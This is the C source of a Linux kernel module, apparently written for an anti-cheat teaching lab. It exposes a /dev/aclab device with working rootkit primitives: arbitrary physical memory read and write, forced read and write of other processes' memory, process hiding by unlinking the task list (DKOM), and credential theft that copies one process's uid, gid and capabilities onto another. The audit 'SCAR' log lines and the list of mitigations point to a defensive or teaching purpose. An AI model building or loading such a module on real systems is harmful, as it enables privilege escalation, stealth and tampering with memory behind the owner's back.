// aclab_module.c — Educational Linux kernel module for anti-cheat lab (T2/T3).
//
// Exposes /dev/aclab with physical + process virtual memory ops, CR3 read,
// DKOM hide, and credential steal. Every operation logs SCAR lines to dmesg.
//
// MITIGATIONS: Lockdown LSM, module signing, kernel auditing, SELinux,
//              CONFIG_STRICT_DEVMEM, IOMMU, HVCI-class integrity (on Windows peers).

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <linux/sched/mm.h>
#include <linux/sched/signal.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <asm/io.h>

#include "aclab_ioctl.h"

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Anti-Cheat Lab");
MODULE_DESCRIPTION("Educational kernel module for T2/T3 research");
MODULE_VERSION("2.0");

static dev_t aclab_dev;
static struct cdev aclab_cdev;
static struct class* aclab_class;

/* ── Physical memory ─────────────────────────────────────────────── */

static int aclab_phys_read(u64 phys_addr, u8* buf, u32 size)
{
	void __iomem* mapped;

	if (!size || size > ACLAB_MAX_XFER)
		return -EINVAL;
	mapped = ioremap(phys_addr, size);
	if (!mapped)
		return -ENOMEM;
	memcpy_fromio(buf, mapped, size);
	iounmap(mapped);
	pr_info("[aclab] PHYS_READ: 0x%llx %u bytes\n",
		(unsigned long long)phys_addr, size);
	pr_info("[aclab] SCAR: ioremap of physical RAM is auditable\n");
	return 0;
}

static int aclab_phys_write(u64 phys_addr, const u8* buf, u32 size)
{
	void __iomem* mapped;

	if (!size || size > ACLAB_MAX_XFER)
		return -EINVAL;
	mapped = ioremap(phys_addr, size);
	if (!mapped)
		return -ENOMEM;
	memcpy_toio(mapped, buf, size);
	iounmap(mapped);
	pr_info("[aclab] PHYS_WRITE: 0x%llx %u bytes\n",
		(unsigned long long)phys_addr, size);
	pr_info("[aclab] SCAR: physical write — integrity scanners may trip\n");
	return 0;
}

/* ── CR3 / pgd ───────────────────────────────────────────────────── */

static int aclab_get_cr3(pid_t pid, u64* cr3_out)
{
	struct task_struct* task;
	struct mm_struct* mm;
	pgd_t* pgd;

	if (!cr3_out)
		return -EINVAL;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	mm = task->mm;
	if (!mm)
		mm = task->active_mm;
	if (!mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	pgd = mm->pgd;
	/* __pa is the physical address of the top-level page directory. */
	*cr3_out = (u64)__pa(pgd);
	rcu_read_unlock();

	pr_info("[aclab] CR3 for pid %d: 0x%llx\n", pid,
		(unsigned long long)*cr3_out);
	return 0;
}

/* ── Virtual R/W via access_remote_vm ────────────────────────────── */

static int aclab_virt_read(pid_t pid, u64 virt_addr, u8* buf, u32 size)
{
	struct task_struct* task;
	struct mm_struct* mm;
	int ret;
	unsigned int copied = 0;

	if (!size || size > ACLAB_MAX_XFER)
		return -EINVAL;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	mm = get_task_mm(task);
	rcu_read_unlock();
	if (!mm)
		return -EINVAL;

	while (copied < size) {
		unsigned int chunk = min_t(unsigned int, PAGE_SIZE, size - copied);
		ret = access_remote_vm(mm, (unsigned long)(virt_addr + copied),
				       buf + copied, chunk, FOLL_FORCE);
		if (ret <= 0)
			break;
		copied += (unsigned int)ret;
	}
	mmput(mm);

	if (copied > 0) {
		pr_info("[aclab] VIRT_READ: pid=%d addr=0x%llx %u bytes\n",
			pid, (unsigned long long)virt_addr, copied);
		return (int)copied;
	}
	return -EFAULT;
}

static int aclab_virt_write(pid_t pid, u64 virt_addr, const u8* buf, u32 size)
{
	struct task_struct* task;
	struct mm_struct* mm;
	int ret;
	unsigned int written = 0;

	if (!size || size > ACLAB_MAX_XFER)
		return -EINVAL;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	mm = get_task_mm(task);
	rcu_read_unlock();
	if (!mm)
		return -EINVAL;

	while (written < size) {
		unsigned int chunk = min_t(unsigned int, PAGE_SIZE, size - written);
		ret = access_remote_vm(mm, (unsigned long)(virt_addr + written),
				       (void*)(buf + written), chunk,
				       FOLL_WRITE | FOLL_FORCE);
		if (ret <= 0)
			break;
		written += (unsigned int)ret;
	}
	mmput(mm);

	if (written > 0) {
		pr_info("[aclab] VIRT_WRITE: pid=%d addr=0x%llx %u bytes\n",
			pid, (unsigned long long)virt_addr, written);
		return (int)written;
	}
	return -EFAULT;
}

/* ── DKOM: unlink from task list ─────────────────────────────────── */

static int aclab_hide_process(pid_t pid)
{
	struct task_struct* task;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	list_del_init(&task->tasks);
	rcu_read_unlock();

	pr_info("[aclab] DKOM: Process %d hidden from task list\n", pid);
	pr_info("[aclab] SCAR: still in pid hash / thread group / /proc\n");
	return 0;
}

/* ── Credential steal (educational) ──────────────────────────────── */

static int aclab_steal_cred(pid_t target_pid, pid_t source_pid)
{
	struct task_struct *target, *source;
	const struct cred* src_cred;
	struct cred* new_creds;

	rcu_read_lock();
	target = pid_task(find_vpid(target_pid), PIDTYPE_PID);
	source = pid_task(find_vpid(source_pid), PIDTYPE_PID);
	if (!target || !source) {
		rcu_read_unlock();
		return -ESRCH;
	}
	src_cred = get_task_cred(source);
	rcu_read_unlock();

	new_creds = prepare_creds();
	if (!new_creds) {
		put_cred(src_cred);
		return -ENOMEM;
	}

	new_creds->uid = src_cred->uid;
	new_creds->gid = src_cred->gid;
	new_creds->euid = src_cred->euid;
	new_creds->egid = src_cred->egid;
	new_creds->suid = src_cred->suid;
	new_creds->sgid = src_cred->sgid;
	new_creds->fsuid = src_cred->fsuid;
	new_creds->fsgid = src_cred->fsgid;
	new_creds->cap_effective = src_cred->cap_effective;
	new_creds->cap_permitted = src_cred->cap_permitted;
	new_creds->cap_bset = src_cred->cap_bset;

	put_cred(src_cred);

	/* commit_creds only applies to current — for foreign target we use
	 * override_creds pattern is wrong. Educational path: install via
	 * rcu_assign on target under task_lock (simplified lab model). */
	task_lock(target);
	rcu_assign_pointer(target->real_cred, new_creds);
	rcu_assign_pointer(target->cred, new_creds);
	get_cred(new_creds);
	task_unlock(target);

	/* Drop the prepare_creds reference we no longer hold exclusively. */
	put_cred(new_creds);

	pr_info("[aclab] CRED_STEAL: pid %d now has pid %d credentials\n",
		target_pid, source_pid);
	pr_info("[aclab] SCAR: cred usage counts / audit user_cmd\n");
	return 0;
}

static int aclab_mod_info(struct aclab_mod_info* mi)
{
	if (!mi)
		return -EINVAL;
	mi->major = MAJOR(aclab_dev);
	mi->minor = MINOR(aclab_dev);
	mi->abi_version = ACLAB_ABI_VERSION;
	memset(mi->build_tag, 0, sizeof(mi->build_tag));
	strncpy(mi->build_tag, "aclab-2.0", sizeof(mi->build_tag) - 1);
	return 0;
}

/* ── IOCTL dispatch ──────────────────────────────────────────────── */

static long aclab_ioctl(struct file* filp, unsigned int cmd, unsigned long arg)
{
	int ret = 0;

	(void)filp;

	switch (cmd) {
	case ACLAB_IOCTL_PHYS_READ: {
		struct aclab_phys_op op;

		if (copy_from_user(&op, (void __user*)arg, sizeof(op)))
			return -EFAULT;
		if (!aclab_phys_op_valid(&op))
			return -EINVAL;
		ret = aclab_phys_read(op.phys_addr, op.data, op.size);
		if (ret == 0 && copy_to_user((void __user*)arg, &op, sizeof(op)))
			return -EFAULT;
		return ret;
	}
	case ACLAB_IOCTL_PHYS_WRITE: {
		struct aclab_phys_op op;

		if (copy_from_user(&op, (void __user*)arg, sizeof(op)))
			return -EFAULT;
		if (!aclab_phys_op_valid(&op))
			return -EINVAL;
		return aclab_phys_write(op.phys_addr, op.data, op.size);
	}
	case ACLAB_IOCTL_GET_CR3: {
		struct aclab_cr3_req req;

		if (copy_from_user(&req, (void __user*)arg, sizeof(req)))
			return -EFAULT;
		ret = aclab_get_cr3(req.pid, &req.cr3);
		if (ret == 0 && copy_to_user((void __user*)arg, &req, sizeof(req)))
			return -EFAULT;
		return ret;
	}
	case ACLAB_IOCTL_VIRT_READ: {
		struct aclab_virt_op op;

		if (copy_from_user(&op, (void __user*)arg, sizeof(op)))
			return -EFAULT;
		if (!aclab_virt_op_valid(&op))
			return -EINVAL;
		ret = aclab_virt_read(op.pid, op.virt_addr, op.data, op.size);
		if (ret > 0) {
			op.size = (u32)ret;
			if (copy_to_user((void __user*)arg, &op, sizeof(op)))
				return -EFAULT;
			return 0;
		}
		return ret;
	}
	case ACLAB_IOCTL_VIRT_WRITE: {
		struct aclab_virt_op op;

		if (copy_from_user(&op, (void __user*)arg, sizeof(op)))
			return -EFAULT;
		if (!aclab_virt_op_valid(&op))
			return -EINVAL;
		ret = aclab_virt_write(op.pid, op.virt_addr, op.data, op.size);
		return ret > 0 ? 0 : ret;
	}
	case ACLAB_IOCTL_HIDE_PROC: {
		pid_t pid;

		if (copy_from_user(&pid, (void __user*)arg, sizeof(pid)))
			return -EFAULT;
		return aclab_hide_process(pid);
	}
	case ACLAB_IOCTL_STEAL_CRED: {
		struct aclab_cred_steal cs;

		if (copy_from_user(&cs, (void __user*)arg, sizeof(cs)))
			return -EFAULT;
		return aclab_steal_cred(cs.target_pid, cs.source_pid);
	}
	case ACLAB_IOCTL_MOD_INFO: {
		struct aclab_mod_info mi;

		ret = aclab_mod_info(&mi);
		if (ret == 0 && copy_to_user((void __user*)arg, &mi, sizeof(mi)))
			return -EFAULT;
		return ret;
	}
	default:
		return -ENOTTY;
	}
}

static int aclab_open(struct inode* inode, struct file* filp)
{
	(void)inode;
	(void)filp;
	pr_info("[aclab] Device opened\n");
	pr_info("[aclab] SCAR: /dev/aclab open is visible in lsof / audit\n");
	return 0;
}

static int aclab_release(struct inode* inode, struct file* filp)
{
	(void)inode;
	(void)filp;
	pr_info("[aclab] Device closed\n");
	return 0;
}

static const struct file_operations aclab_fops = {
	.owner = THIS_MODULE,
	.open = aclab_open,
	.release = aclab_release,
	.unlocked_ioctl = aclab_ioctl,
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 14, 0)
	.compat_ioctl = aclab_ioctl,
#endif
};

static int __init aclab_init(void)
{
	int ret;

	pr_info("[aclab] Educational kernel module loading (ABI %u)...\n",
		ACLAB_ABI_VERSION);

	ret = alloc_chrdev_region(&aclab_dev, ACLAB_MINOR_DEFAULT, 1,
				  ACLAB_DEV_NAME);
	if (ret < 0) {
		/* Fallback to fixed major for older lab scripts. */
		aclab_dev = MKDEV(ACLAB_MAJOR_DEFAULT, ACLAB_MINOR_DEFAULT);
		ret = register_chrdev_region(aclab_dev, 1, ACLAB_DEV_NAME);
		if (ret < 0) {
			pr_err("[aclab] Failed to register device number\n");
			return ret;
		}
	}

	cdev_init(&aclab_cdev, &aclab_fops);
	aclab_cdev.owner = THIS_MODULE;
	ret = cdev_add(&aclab_cdev, aclab_dev, 1);
	if (ret < 0) {
		unregister_chrdev_region(aclab_dev, 1);
		pr_err("[aclab] Failed to add cdev\n");
		return ret;
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
	aclab_class = class_create(ACLAB_CLASS_NAME);
#else
	aclab_class = class_create(THIS_MODULE, ACLAB_CLASS_NAME);
#endif
	if (IS_ERR(aclab_class)) {
		ret = PTR_ERR(aclab_class);
		cdev_del(&aclab_cdev);
		unregister_chrdev_region(aclab_dev, 1);
		pr_err("[aclab] Failed to create class\n");
		return ret;
	}

	if (IS_ERR(device_create(aclab_class, NULL, aclab_dev, NULL,
				 ACLAB_DEV_NAME))) {
		class_destroy(aclab_class);
		cdev_del(&aclab_cdev);
		unregister_chrdev_region(aclab_dev, 1);
		pr_err("[aclab] Failed to create device node\n");
		return -EINVAL;
	}

	pr_info("[aclab] Module loaded. Device /dev/%s (major %d minor %d)\n",
		ACLAB_DEV_NAME, MAJOR(aclab_dev), MINOR(aclab_dev));
	pr_info("[aclab] SCAR: visible in /proc/modules, /sys/module/\n");
	pr_info("[aclab] MITIGATION: Lockdown LSM, module signing, Secure Boot\n");
	return 0;
}

static void __exit aclab_exit(void)
{
	device_destroy(aclab_class, aclab_dev);
	class_destroy(aclab_class);
	cdev_del(&aclab_cdev);
	unregister_chrdev_region(aclab_dev, 1);
	pr_info("[aclab] Module unloaded\n");
}

module_init(aclab_init);
module_exit(aclab_exit);
